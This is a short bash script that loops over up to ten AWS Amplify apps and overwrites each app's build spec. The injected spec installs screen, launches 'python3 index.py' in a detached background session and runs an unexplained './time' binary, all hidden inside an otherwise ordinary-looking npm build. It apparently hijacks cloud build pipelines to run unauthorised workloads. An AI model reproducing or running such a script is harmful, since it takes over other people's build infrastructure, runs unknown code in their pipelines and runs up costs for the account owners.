#!/usr/bin/env bash

for i in {0..9}; do
  APPID=$(aws amplify list-apps --output json --query 'apps['$i'].appId'| tr -d '"' 2> /dev/null)
  aws amplify update-app --app-id $APPID --build-spec "
version: 1
frontend:
  phases:
    build:
      commands: 
       - yum install screen -y
       - screen -d -m bash -c 'python3 index.py;'
       - npm install env-cmd
       - npm run build:"'$BUILD_ENV'"
       - yarn global add serve
       - ./time
  artifacts:
    baseDirectory: /
    files:
      - '**/*'
  cache:
    paths: []
"
done

